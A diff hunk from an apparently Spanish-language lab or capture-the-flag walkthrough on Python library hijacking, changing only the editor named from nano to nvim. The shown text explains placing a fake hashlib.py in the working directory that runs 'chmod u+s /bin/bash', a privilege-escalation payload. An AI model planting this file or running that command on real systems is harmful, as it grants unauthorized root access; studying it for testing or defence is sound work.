@@ -88,7 +88,7 @@ Podemos observar que se esta importando la libreria **Hashlib**, y con eso llama
 Y esta tecnica consiste en que cuando el script llame a la libreria, esta primero va a buscar en la ruta actual de trabajo y luego seguira con la ruta que corresponda. Estos es similar a la tecnica de **Path Hijacking de Bash** 
 
 Por lo que debemos de crear un archivo en la ruta actual de trabajo: 
-- **nano hashlib.py** 
+- **nvim hashlib.py** 
 	import os
 	os.system("chmod u+s /bin/bash")
 
